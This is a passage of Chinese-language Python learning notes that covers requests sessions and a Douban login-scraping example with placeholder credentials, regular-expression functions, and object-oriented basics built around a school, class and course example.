<span class="hljs-comment">#requests.put(url, data=None, **kwargs) PUT&#x8BF7;&#x6C42;</span>
<span class="hljs-comment">#requests.delete(url, **kwargs) DELETE&#x8BF7;&#x6C42;</span>
<span class="hljs-comment">#requests.head(url, **kwargs)HEAD&#x8BF7;&#x6C42;</span>
<span class="hljs-comment">#requests.options()OPTIONS&#x8BF7;&#x6C42;</span>
<span class="hljs-comment">#requests.patch(url, data=None, **kwargs)PATCH&#x8BF7;&#x6C42;</span>
<span class="hljs-comment">#&#x90FD;&#x662F;&#x83B7;&#x53D6;&#x7F51;&#x5740;&#x7136;&#x540E;&#x4F7F;&#x6211;&#x4EEC;&#x4ECE;&#x4E2D;&#x83B7;&#x53D6;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x4FE1;&#x606F;</span>
</code></pre>
<h6 id="session&#x7EF4;&#x6301;&#x4F1A;&#x8BDD;">session()&#x7EF4;&#x6301;&#x4F1A;&#x8BDD;</h6>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests

s = requests.Session()
<span class="hljs-comment"># &#x7B2C;&#x4E00;&#x6B65;&#xFF1A;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x8BF7;&#x6C42;&#x4E2D;&#x7684;cookies</span>
<span class="hljs-comment"># tips: http://httpbin.org&#x80FD;&#x591F;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;http&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;</span>
s.get(<span class="hljs-string">&apos;http://httpbin.org/cookies/set/sessioncookie/123456789&apos;</span>)
<span class="hljs-comment"># &#x7B2C;&#x4E8C;&#x6B65;&#xFF1A;&#x518D;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x4E2D;&#x7684;cookies</span>
r = s.get(<span class="hljs-string">&quot;http://httpbin.org/cookies&quot;</span>)
print(r.text)
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment">#requests.session():&#x7EF4;&#x6301;&#x4F1A;&#x8BDD;,&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x4EEC;&#x5728;&#x8DE8;&#x8BF7;&#x6C42;&#x65F6;&#x4FDD;&#x5B58;&#x67D0;&#x4E9B;&#x53C2;&#x6570;</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-comment">#&#x5B9E;&#x4F8B;&#x5316;session</span>
session = requests.session()
<span class="hljs-comment">#&#x76EE;&#x6807;url</span>
url = <span class="hljs-string">&apos;https://www.douban.com/accounts/login&apos;</span>
form_data = {
    <span class="hljs-string">&apos;source&apos;</span>: <span class="hljs-string">&apos;index_nav&apos;</span>,
    <span class="hljs-string">&apos;form_email&apos;</span>: <span class="hljs-string">&apos;xxx&apos;</span>,
    <span class="hljs-string">&apos;form_password&apos;</span>: <span class="hljs-string">&apos;xxx&apos;</span>,
    <span class="hljs-string">&apos;captcha-solution&apos;</span>: <span class="hljs-string">&apos;stamp&apos;</span>,
    <span class="hljs-string">&apos;captcha-id&apos;</span>: <span class="hljs-string">&apos;b3dssX515MsmNaklBX8uh5Ab:en&apos;</span>
}
<span class="hljs-comment">#&#x8BBE;&#x7F6E;&#x8BF7;&#x6C42;&#x5934;</span>
req_header = {
    <span class="hljs-string">&apos;User-Agent&apos;</span>:<span class="hljs-string">&apos;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;</span>,
}
<span class="hljs-comment">#&#x4F7F;&#x7528;session&#x53D1;&#x8D77;&#x8BF7;&#x6C42;</span>
response = session.post(url,headers=req_header,data=form_data)
<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    <span class="hljs-comment">#&#x8BBF;&#x95EE;&#x4E2A;&#x4EBA;&#x4E3B;&#x9875;&#xFF1A;</span>
    url = <span class="hljs-string">&apos;https://www.douban.com/people/175417123/&apos;</span>
    response = session.get(url,headers = req_header)
    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;douban3.html&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>) <span class="hljs-keyword">as</span> file:
            file.write(response.text)
</code></pre>
<h5 id="re">re</h5>
<p><a href="https://imgtu.com/i/bwjnts" target="_blank"><img src="https://s4.ax1x.com/2022/03/05/bwjnts.png" alt="bwjnts.png"></a></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> re

<span class="hljs-comment"># findall:  &#x5339;&#x914D;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x7B26;&#x5408;&#x6B63;&#x5219;&#x7684;&#x5185;&#x5BB9;</span>
lst = re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;&#x6211;&#x7684;&#x7535;&#x8BDD;&#x53F7;&#x662F;:10086, &#x6211;&#x5973;&#x670B;&#x53CB;&#x7684;&#x7535;&#x8BDD;&#x662F;:10010&quot;</span>)
print(lst)

<span class="hljs-comment"># finditer: &#x5339;&#x914D;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x5185;&#x5BB9;[&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x8FED;&#x4EE3;&#x5668;], &#x4ECE;&#x8FED;&#x4EE3;&#x5668;&#x4E2D;&#x62FF;&#x5230;&#x5185;&#x5BB9;&#x9700;&#x8981;.group()</span>
it = re.finditer(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;&#x6211;&#x7684;&#x7535;&#x8BDD;&#x53F7;&#x662F;:10086, &#x6211;&#x5973;&#x670B;&#x53CB;&#x7684;&#x7535;&#x8BDD;&#x662F;:10010&quot;</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> it:
    print(i.group())

<span class="hljs-comment"># search, &#x627E;&#x5230;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#x5C31;&#x8FD4;&#x56DE;, &#x8FD4;&#x56DE;&#x7684;&#x7ED3;&#x679C;&#x662F;match&#x5BF9;&#x8C61;. &#x62FF;&#x6570;&#x636E;&#x9700;&#x8981;.group()</span>
s = re.search(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;&#x6211;&#x7684;&#x7535;&#x8BDD;&#x53F7;&#x662F;:10086, &#x6211;&#x5973;&#x670B;&#x53CB;&#x7684;&#x7535;&#x8BDD;&#x662F;:10010&quot;</span>)
print(s.group())


<span class="hljs-comment"># match&#x662F;&#x4ECE;&#x5934;&#x5F00;&#x59CB;&#x5339;&#x914D;</span>
s = re.match(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;10086, &#x6211;&#x5973;&#x670B;&#x53CB;&#x7684;&#x7535;&#x8BDD;&#x662F;:10010&quot;</span>)
print(s.group())

<span class="hljs-comment"># &#x9884;&#x52A0;&#x8F7D;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</span>
obj = re.compile(<span class="hljs-string">r&quot;\d+&quot;</span>)

ret = obj.finditer(<span class="hljs-string">&quot;&#x6211;&#x7684;&#x7535;&#x8BDD;&#x53F7;&#x662F;:10086, &#x6211;&#x5973;&#x670B;&#x53CB;&#x7684;&#x7535;&#x8BDD;&#x662F;:10010&quot;</span>)
<span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> ret:
    print(it.group())

ret = obj.findall(<span class="hljs-string">&quot;&#x5475;&#x5475;&#x54D2;, &#x6211;&#x5C31;&#x4E0D;&#x4FE1;&#x4F60;&#x4E0D;&#x6362;&#x6211;1000000000&quot;</span>)
print(ret)

s = <span class="hljs-string">&quot;&quot;&quot;
&lt;div class=&apos;jay&apos;&gt;&lt;span id=&apos;1&apos;&gt;&#x90ED;&#x9E92;&#x9E9F;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&apos;jj&apos;&gt;&lt;span id=&apos;2&apos;&gt;&#x5B8B;&#x94C1;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&apos;jolin&apos;&gt;&lt;span id=&apos;3&apos;&gt;&#x5927;&#x806A;&#x660E;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&apos;sylar&apos;&gt;&lt;span id=&apos;4&apos;&gt;&#x8303;&#x601D;&#x54F2;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&apos;tory&apos;&gt;&lt;span id=&apos;5&apos;&gt;&#x80E1;&#x8BF4;&#x516B;&#x9053;&lt;/span&gt;&lt;/div&gt;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># (?P&lt;&#x5206;&#x7EC4;&#x540D;&#x5B57;&gt;&#x6B63;&#x5219;) &#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x4ECE;&#x6B63;&#x5219;&#x5339;&#x914D;&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x53D6;&#x5185;&#x5BB9;</span>
obj = re.compile(<span class="hljs-string">r&quot;&lt;div class=&apos;.*?&apos;&gt;&lt;span id=&apos;(?P&lt;id&gt;\d+)&apos;&gt;(?P&lt;wahaha&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)  <span class="hljs-comment"># re.S: &#x8BA9;.&#x80FD;&#x5339;&#x914D;&#x6362;&#x884C;&#x7B26;</span>

result = obj.finditer(s)
<span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> result:
    print(it.group(<span class="hljs-string">&quot;wahaha&quot;</span>))
    print(it.group(<span class="hljs-string">&quot;id&quot;</span>))
</code></pre>
<h4 id="&#x7C7B;&#x548C;&#x5BF9;&#x8C61;">&#x7C7B;&#x548C;&#x5BF9;&#x8C61;</h4>
<p><a href="https://imgtu.com/i/bBt4c4" target="_blank"><img src="https://s1.ax1x.com/2022/03/06/bBt4c4.png" alt="bBt4c4.png"></a></p>
<p><a href="https://imgtu.com/i/bBtTBR" target="_blank"><img src="https://s1.ax1x.com/2022/03/06/bBtTBR.png" alt="bBtTBR.png"></a></p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x7C7B;&#x662F;&#x5BF9;&#x8C61;&#x76F8;&#x4F3C;&#x6570;&#x636E;&#x4E0E;&#x529F;&#x80FD;&#x7684;&#x96C6;&#x5408;&#x4F53;</span>
<span class="hljs-comment"># &#x6240;&#x4EE5;&#x7C7B;&#x4F53;&#x4E2D;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x662F;&#x53D8;&#x91CF;&#x4E0E;&#x51FD;&#x6570;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x4F46;&#x662F;&#x7C7B;&#x4F53;&#x5176;&#x5B9E;&#x662F;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x4EFB;&#x610F;&#x5176;&#x4ED6;&#x4EE3;&#x7801;&#x7684;</span>
<span class="hljs-comment"># &#x6CE8;&#x610F;&#xFF1A;&#x7C7B;&#x4F53;&#x4EE3;&#x7801;&#x662F;&#x5728;&#x7C7B;&#x5B9A;&#x4E49;&#x9636;&#x6BB5;&#x5C31;&#x4F1A;&#x7ACB;&#x5373;&#x6267;&#x884C;&#xFF0C;&#x4F1A;&#x4EA7;&#x751F;&#x7C7B;&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>
</code></pre>
<p><a href="https://imgtu.com/i/bBNF4f" target="_blank"><img src="https://s1.ax1x.com/2022/03/06/bBNF4f.png" alt="bBNF4f.png"></a></p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>:</span>
    <span class="hljs-comment"># 1&#x3001;&#x53D8;&#x91CF;&#x7684;&#x5B9A;&#x4E49;</span>
    stu_school=<span class="hljs-string">&apos;oldboy&apos;</span>

    <span class="hljs-comment"># 2&#x3001;&#x529F;&#x80FD;&#x7684;&#x5B9A;&#x4E49;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tell_stu_info</span><span class="hljs-params">(stu_obj)</span>:</span>
        print(<span class="hljs-string">&apos;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#xFF1A;&#x540D;&#x5B57;&#xFF1A;%s &#x5E74;&#x9F84;&#xFF1A;%s &#x6027;&#x522B;&#xFF1A;%s&apos;</span> %(
            stu_obj[<span class="hljs-string">&apos;stu_name&apos;</span>],
            stu_obj[<span class="hljs-string">&apos;stu_age&apos;</span>],
            stu_obj[<span class="hljs-string">&apos;stu_gender&apos;</span>]
        ))

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_info</span><span class="hljs-params">(stu_obj,x,y,z)</span>:</span>
        stu_obj[<span class="hljs-string">&apos;stu_name&apos;</span>]=x
        stu_obj[<span class="hljs-string">&apos;stu_age&apos;</span>]=y
        stu_obj[<span class="hljs-string">&apos;stu_gender&apos;</span>]=z

<span class="hljs-comment"># &#x5C5E;&#x6027;&#x8BBF;&#x95EE;&#x7684;&#x8BED;&#x6CD5;</span>
<span class="hljs-comment"># 1&#x3001;&#x8BBF;&#x95EE;&#x6570;&#x636E;&#x5C5E;&#x6027;</span>
<span class="hljs-comment"># print(Student.stu_school) # Student.__dict__[&apos;stu_school&apos;]</span>
<span class="hljs-comment"># 2&#x3001;&#x8BBF;&#x95EE;&#x51FD;&#x6570;&#x5C5E;&#x6027;</span>
<span class="hljs-comment"># print(Student.set_info) # Student.__dict__[&apos;set_info&apos;]</span>

stu1_obj = Student()

stu1_obj.__dict__[<span class="hljs-string">&apos;stu_name&apos;</span>] = <span class="hljs-string">&apos;batmanfuture&apos;</span>
stu1_obj.__dict__[<span class="hljs-string">&apos;stu_age&apos;</span>] = <span class="hljs-string">&apos;20&apos;</span>
stu1_obj.__dict__[<span class="hljs-string">&apos;stu_gender&apos;</span>] = <span class="hljs-string">&apos;male&apos;</span>

print(stu1_obj.__dict__)
<span class="hljs-comment">#   ----------------------------</span>
stu1_obj.stu_name = <span class="hljs-string">&apos;batmanfuture&apos;</span>
stu1_obj.stu_age = <span class="hljs-string">&apos;20&apos;</span>
stu1_obj.stu_gender = <span class="hljs-string">&apos;male&apos;</span>
print(stu1_obj.__dict__)
</code></pre>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span><span class="hljs-params">(obj,x,y,z)</span>:</span>
    obj.stu_name = x
    obj.stu_age = y
    obj.stu_gender = z

init(stu1_obj,<span class="hljs-string">&apos;batmanfuture&apos;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&apos;male&apos;</span>)
print(stu1_obj.__dict__)
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x5F53;&#x6211;&#x4EEC;&#x8C03;&#x7528;&#x8FC7;&#x7A0B;&#x65F6;&#xFF0C;&#x4F1A;&#x4EA7;&#x751F;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x7C7B;&#x91CC;&#x9762; </span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(obj,x,y,z)</span>:</span>
    obj.stu_name = x
    obj.stu_age = y
    obj.stu_gender = z

stu1_obj = Student(<span class="hljs-string">&quot;batmanfuture&quot;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&apos;male&apos;</span>)

<span class="hljs-comment">#    &#x8C03;&#x7528;&#x7C7B;&#x7684;&#x8FC7;&#x7A0B;&#x53C8;&#x79F0;&#x4E4B;&#x4E3A;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x53D1;&#x751F;&#x4E86;&#x4E09;&#x4EF6;&#x4E8B;</span>
<span class="hljs-comment"># 1&#x3001;&#x5148;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x7A7A;&#x5BF9;&#x8C61;</span>
<span class="hljs-comment"># 2&#x3001;python&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x7C7B;&#x4E2D;&#x7684;__init__&#x65B9;&#x6CD5;&#x7136;&#x5C06;&#x7A7A;&#x5BF9;&#x8C61;&#x5DF2;&#x7ECF;&#x8C03;&#x7528;&#x7C7B;&#x65F6;&#x62EC;&#x53F7;&#x5185;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E00;&#x540C;&#x4F20;&#x7ED9;__init__&#x65B9;&#x6CD5;</span>
<span class="hljs-comment"># 3&#x3001;&#x8FD4;&#x56DE;&#x521D;&#x59CB;&#x5B8C;&#x7684;&#x5BF9;&#x8C61;</span>

stu1_obj = Student(<span class="hljs-string">&quot;batmanfuture&quot;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&apos;male&apos;</span>) <span class="hljs-comment">#    &#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x4E0D;&#x5FC5;&#x4F20;&#x5165;obj&#xFF0C;&#x8C03;&#x7528;&#x65F6;&#x5BF9;&#x65B9;&#x4F1A;&#x81EA;&#x52A8;&#x628A;obj = stu1_obj&#xFF0C;&#x540C;&#x7406;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x628A;&#x8FD9;&#x91CC;&#x7684;obj&#x6539;&#x6210;self</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,x,y,z)</span>:</span>
    self.stu_name = x
    self.stu_age = y
    self.stu_gender = z

<span class="hljs-comment"># &#x603B;&#x7ED3;__init__&#x65B9;&#x6CD5;</span>
<span class="hljs-comment"># 1&#x3001;&#x4F1A;&#x5728;&#x8C03;&#x7528;&#x7C7B;&#x65F6;&#x81EA;&#x52A8;&#x89E6;&#x53D1;&#x6267;&#x884C;&#xFF0C;&#x7528;&#x6765;&#x4E3A;&#x5BF9;&#x8C61;&#x521D;&#x59CB;&#x5316;&#x81EA;&#x5DF1;&#x72EC;&#x6709;&#x7684;&#x6570;&#x636E;</span>
<span class="hljs-comment"># 2&#x3001;__init__&#x5185;&#x5E94;&#x8BE5;&#x5B58;&#x653E;&#x662F;&#x4E3A;&#x5BF9;&#x8C61;&#x521D;&#x59CB;&#x5316;&#x5C5E;&#x6027;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x662F;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x4EFB;&#x610F;&#x5176;&#x4ED6;&#x4EE3;&#x7801;&#xFF0C;&#x60F3;&#x8981;&#x5728;</span>
<span class="hljs-comment">#    &#x7C7B;&#x8C03;&#x7528;&#x65F6;&#x5C31;&#x7ACB;&#x523B;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x90FD;&#x53EF;&#x4EE5;&#x653E;&#x5230;&#x8BE5;&#x65B9;&#x6CD5;&#x5185;</span>
<span class="hljs-comment"># 3&#x3001;__init__&#x65B9;&#x6CD5;&#x5FC5;&#x987B;&#x8FD4;&#x56DE;None</span>
</code></pre>
<h5 id="&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;">&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;</h5>
<pre><code class="lang-python">&#x7C7B;&#x7684;&#x6570;&#x636E;&#x5C5E;&#x6027;&#x662F;&#x5171;&#x4EAB;&#x7ED9;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x7528;&#x7684;&#xFF0C;&#x5927;&#x5BB6;&#x8BBF;&#x95EE;&#x7684;&#x5730;&#x5740;&#x90FD;&#x4E00;&#x6837;
&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#x4E3B;&#x8981;&#x662F;&#x7ED9;&#x5BF9;&#x8C61;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x662F;&#x7ED1;&#x5B9A;&#x7ED9;&#x5BF9;&#x8C61;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x6307;&#x5411;&#x7684;&#x90FD;&#x662F;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x7ED1;&#x5B9A;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x5BF9;&#x8C61;&#x5C31;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;&#xFF0C;&#x5185;&#x5B58;&#x5730;&#x5740;&#x5404;&#x4E0D;&#x76F8;&#x540C;
</code></pre>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
@&#x4F5C;&#x8005;: egon&#x8001;&#x6E7F;
@&#x5FAE;&#x4FE1;:18611453110
@&#x4E13;&#x680F;: https://zhuanlan.zhihu.com/c_1189883314197168128
&quot;&quot;&quot;</span>


<span class="hljs-comment"># &#x6574;&#x5408;-&gt;&#x89E3;&#x8026;&#x5408;-&gt;&#x6269;&#x5C55;&#x6027;&#x589E;&#x5F3A;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">School</span>:</span>
    school_name = <span class="hljs-string">&apos;OLDBOY&apos;</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, nickname, addr)</span>:</span>
        self.nickname = nickname
        self.addr = addr
        self.classes = []

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">related_class</span><span class="hljs-params">(self, class_obj)</span>:</span>
        <span class="hljs-comment"># self.classes.append(&#x73ED;&#x7EA7;&#x540D;&#x5B57;)</span>
        <span class="hljs-comment"># self.classes.append(class_name)</span>
        self.classes.append(class_obj)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tell_class</span><span class="hljs-params">(self)</span>:</span> <span class="hljs-comment"># &#x6539;</span>
        <span class="hljs-comment"># &#x6253;&#x5370;&#x7684;&#x73ED;&#x7EA7;&#x7684;&#x540D;&#x5B57;</span>
        print(self.nickname.center(<span class="hljs-number">60</span>,<span class="hljs-string">&apos;=&apos;</span>))
        <span class="hljs-comment"># &#x6253;&#x5370;&#x73ED;&#x7EA7;&#x5F00;&#x8BBE;&#x7684;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span>
        <span class="hljs-keyword">for</span> class_obj <span class="hljs-keyword">in</span> self.classes:
            class_obj.tell_course()


<span class="hljs-comment"># # &#x4E00;&#xFF1A;&#x5B66;&#x6821;</span>
<span class="hljs-comment"># #1&#x3001;&#x521B;&#x5EFA;&#x6821;&#x533A;</span>
school_obj1=School(<span class="hljs-string">&apos;&#x8001;&#x7537;&#x5B69;&#x9B54;&#x90FD;&#x6821;&#x533A;&apos;</span>,<span class="hljs-string">&apos;&#x4E0A;&#x6D77;&apos;</span>)
school_obj2=School(<span class="hljs-string">&apos;&#x8001;&#x7537;&#x5B69;&#x5E1D;&#x90FD;&#x6821;&#x533A;&apos;</span>,<span class="hljs-string">&apos;&#x5317;&#x4EAC;&apos;</span>)
<span class="hljs-comment">#</span>
<span class="hljs-comment"># #2&#x3001;&#x4E3A;&#x5B66;&#x6821;&#x5F00;&#x8BBE;&#x73ED;&#x7EA7;</span>
<span class="hljs-comment"># # &#x4E0A;&#x6D77;&#x6821;&#x533A;&#x5F00;&#x4E86;:&#x8131;&#x4EA7;14&#x671F;&#xFF0C;&#x4E0A;&#x6D77;&#x6821;&#x533A;&#x5F00;&#x4E86;&#x8131;&#x4EA7;15&#x671F;</span>
<span class="hljs-comment"># school_obj1.related_class(&quot;&#x8131;&#x4EA7;14&#x671F;&quot;)</span>
<span class="hljs-comment"># school_obj1.related_class(&quot;&#x8131;&#x4EA7;15&#x671F;&quot;)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># # &#x5317;&#x4EAC;&#x6821;&#x533A;&#x5F00;&#x4E86;:&#x8131;&#x4EA7;29&#x671F;</span>
<span class="hljs-comment"># school_obj2.related_class(&quot;&#x8131;&#x4EA7;29&#x671F;&quot;)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># #3&#x3001;&#x67E5;&#x770B;&#x6BCF;&#x4E2A;&#x6821;&#x533A;&#x5F00;&#x8BBE;&#x7684;&#x73ED;&#x7EA7;</span>
<span class="hljs-comment"># school_obj1.tell_class()</span>
<span class="hljs-comment"># school_obj2.tell_class()</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Class</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, name)</span>:</span>
        self.name = name
        self.course = <span class="hljs-keyword">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">related_course</span><span class="hljs-params">(self, course_obj)</span>:</span>
        <span class="hljs-comment"># self.course = course_name</span>
        self.course = course_obj

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tell_course</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;%s&apos;</span> % self.name,end=<span class="hljs-string">&quot; &quot;</span>)
        self.course.tell_info() <span class="hljs-comment"># &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;</span>

<span class="hljs-comment"># &#x4E8C;&#xFF1A;&#x73ED;&#x7EA7;</span>
<span class="hljs-comment"># 1&#x3001;&#x521B;&#x5EFA;&#x73ED;&#x7EA7;</span>
class_obj1 = Class(<span class="hljs-string">&apos;&#x8131;&#x4EA7;14&#x671F;&apos;</span>)
class_obj2 = Class(<span class="hljs-string">&apos;&#x8131;&#x4EA7;15&#x671F;&apos;</span>)
class_obj3 = Class(<span class="hljs-string">&apos;&#x8131;&#x4EA7;29&#x671F;&apos;</span>)

<span class="hljs-comment"># 2&#x3001;&#x4E3A;&#x73ED;&#x7EA7;&#x5173;&#x8054;&#x4E00;&#x4E2A;&#x8BFE;&#x7A0B;</span>
<span class="hljs-comment"># class_obj1.related_course(&apos;python&#x5168;&#x6808;&#x5F00;&#x53D1;&apos;)</span>
<span class="hljs-comment"># class_obj2.related_course(&apos;linux&#x8FD0;&#x7EF4;&apos;)</span>
<span class="hljs-comment"># class_obj3.related_course(&apos;python&#x5168;&#x6808;&#x5F00;&#x53D1;&apos;)</span>

<span class="hljs-comment"># 3&#x3001;&#x67E5;&#x770B;&#x73ED;&#x7EA7;&#x5F00;&#x8BBE;&#x7684;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span>
<span class="hljs-comment"># class_obj1.tell_course()</span>
<span class="hljs-comment"># class_obj2.tell_course()</span>
<span class="hljs-comment"># class_obj3.tell_course()</span>

<span class="hljs-comment"># 4&#x3001;&#x4E3A;&#x5B66;&#x6821;&#x5F00;&#x8BBE;&#x73ED;&#x7EA7;</span>
<span class="hljs-comment"># &#x4E0A;&#x6D77;&#x6821;&#x533A;&#x5F00;&#x4E86;:&#x8131;&#x4EA7;14&#x671F;&#xFF0C;&#x4E0A;&#x6D77;&#x6821;&#x533A;&#x5F00;&#x4E86;&#x8131;&#x4EA7;15&#x671F;</span>
school_obj1.related_class(class_obj1)
school_obj1.related_class(class_obj2)

<span class="hljs-comment"># &#x5317;&#x4EAC;&#x6821;&#x533A;&#x5F00;&#x4E86;:&#x8131;&#x4EA7;29&#x671F;</span>
school_obj2.related_class(class_obj3)


<span class="hljs-comment"># school_obj1.tell_class()</span>
<span class="hljs-comment"># school_obj2.tell_class()</span>



<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Course</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,period,price)</span>:</span>
        self.name=name
        self.period=period
        self.price=price

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tell_info</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;&lt;&#x8BFE;&#x7A0B;&#x540D;:%s &#x5468;&#x671F;:%s &#x4EF7;&#x94B1;:%s&gt;&apos;</span> %(self.name,self.period,self.price))
<span class="hljs-comment"># &#x4E09;&#xFF1A;&#x8BFE;&#x7A0B;</span>
<span class="hljs-comment"># 1&#x3001;&#x521B;&#x5EFA;&#x8BFE;&#x7A0B;</span>
course_obj1=Course(<span class="hljs-string">&apos;python&#x5168;&#x6808;&#x5F00;&#x53D1;&apos;</span>,<span class="hljs-string">&apos;6mons&apos;</span>,<span class="hljs-number">20000</span>)
course_obj2=Course(<span class="hljs-string">&apos;linux&#x8FD0;&#x7EF4;&apos;</span>,<span class="hljs-string">&apos;5mons&apos;</span>,<span class="hljs-number">18000</span>)

<span class="hljs-comment"># 2&#x3001;&#x67E5;&#x770B;&#x8BFE;&#x7A0B;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;</span>
<span class="hljs-comment"># course_obj1.tell_info()</span>
<span class="hljs-comment"># course_obj2.tell_info()</span>

<span class="hljs-comment"># 3&#x3001;&#x4E3A;&#x73ED;&#x7EA7;&#x5173;&#x8054;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;</span>
class_obj1.related_course(course_obj1)
class_obj2.related_course(course_obj2)
class_obj3.related_course(course_obj1)

<span class="hljs-comment"># class_obj1.tell_course()</span>
<span class="hljs-comment"># class_obj2.tell_course()</span>
<span class="hljs-comment"># class_obj3.tell_course()</span>

school_obj1.tell_class()
school_obj2.tell_class()


